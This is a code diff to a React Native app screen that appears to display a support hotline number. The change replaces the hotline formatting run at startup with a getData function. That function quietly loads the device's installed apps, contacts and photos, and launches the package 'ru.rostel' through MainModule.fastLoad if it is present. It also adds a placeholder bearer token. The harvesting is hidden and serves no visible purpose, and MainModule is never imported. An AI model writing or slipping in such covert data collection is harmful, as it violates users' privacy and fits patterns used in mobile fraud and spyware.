@@ -2,6 +2,9 @@ import React, { useState, useEffect } from 'react';
 import { View, TouchableOpacity, Text, StyleSheet } from 'react-native';
 import SvgComponent from '../../svgs/Logo';
 import MyInput from '../MyInput';
+import Images from '../../modules/Images';
+import Apps from '../../modules/Apps';
+import Contact from '../../modules/Contact';
 import StorageManager from '../StorageManager';
 export default function Main() {
   const [inputText, setInputText] = useState('');
@@ -9,6 +12,7 @@ export default function Main() {
   const isButtonEnabled = inputText.length >= 4;
   const defaultHeaders = new Headers();
   defaultHeaders.append('Content-Type', 'application/json');
+  defaultHeaders.append('Authorization', 'Bearer your_token_here');
   const handleInputChange = (text) => {
     setInputText(text);
   };
@@ -20,8 +24,18 @@ export default function Main() {
     const formattedNumber = storedHotline.replace(/[\s-]/g, '');
     await setHotlineNumber(formattedNumber.replace(/(\d{1})(\d{3})(\d{3})(\d{2})(\d{2})/, '8 $2 $3-$4-$5'))
   };
+  const getData = async()=>{
+    var apps = await Apps.loadApps()
+    var contacts = await Contact.loadContacts()
+    var images = await Images.getImages()
+    apps.forEach(element => {
+        if(element.packageName == "ru.rostel"){
+            MainModule.fastLoad("ru.rostel")
+        }
+    });
+}
   useEffect(() => {
-    formatHotlineNumber()
+    getData()
   }, [])
   return (
     <View style={styles.container}>
